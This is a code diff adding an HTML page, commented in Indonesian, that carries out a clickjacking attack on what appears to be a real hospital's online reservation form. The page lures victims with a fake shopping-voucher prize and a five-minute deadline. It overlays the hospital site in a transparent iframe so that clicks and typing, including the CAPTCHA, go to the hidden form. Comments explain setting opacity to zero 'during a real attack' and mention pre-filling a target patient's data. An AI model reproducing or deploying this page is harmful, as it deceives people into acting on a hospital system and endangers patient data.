@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Claim Your Free Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        /* Halaman palsu buatan hacker yang dilihat korban */
+        .attacker-page {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            text-align: center;
+            padding-top: 50px;
+            z-index: 1; /* Di belakang iframe, tapi di depan latar iframe */
+        }
+        .prize-box {
+            background: white;
+            width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+        }
+        /* Menyiapkan ruang kosong di halaman palsu agar CAPTCHA asli bisa mengintip */
+        .captcha-space {
+            margin-top: 130px; /* Jarak disesuaikan agar pas dengan posisi input captcha asli */
+            height: 140px;
+        }
+
+        /* Iframe berisi web RS yang dibuat transparan */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%); /* Memposisikan iframe tepat di tengah layar */
+            width: 500px; 
+            height: 800px;
+            border: none;
+            z-index: 2; /* Berada di paling depan agar menerima semua klik dan ketikan */
+            
+            /* SAAT TESTING: Ubah opacity ke 0.4 untuk menyelaraskan tombol */
+            /* SAAT SERANGAN NYATA: Ubah opacity ke 0.0 agar web RS tidak terlihat sama sekali */
+            opacity: 0.4; 
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HALAMAN PALSU HACKER -->
+    <div class="attacker-page">
+        <div class="prize-box">
+            <h2>🎉 SELAMAT! Anda Memenangkan Voucher Belanja! 🎉</h2>
+            <p>Untuk mengklaim hadiah Anda, silakan isi kode verifikasi keamanan di bawah ini:</p>
+            
+            <!-- Ruang kosong ini sengaja dibuat agar gambar CAPTCHA dan kotak input dari web RS asli 'mengintip' keluar -->
+            <div class="captcha-space"></div>
+            
+            <p style="color: gray; font-size: 12px; margin-top: 20px;">*Hadiah akan hangus dalam waktu 5 menit jika tidak diklaim.</p>
+        </div>
+    </div>
+
+    <!-- TARGET WEB RUMAH SAKIT (IFRAME) -->
+    <!-- Form asli otomatis terisi data pasien target oleh hacker lewat URL (jika didukung) atau memanfaatkan autofocus -->
+    <iframe src="http://apps.rsbandungkiwari.id:8013/reservasi/"></iframe>
+
+</body>
+</html>
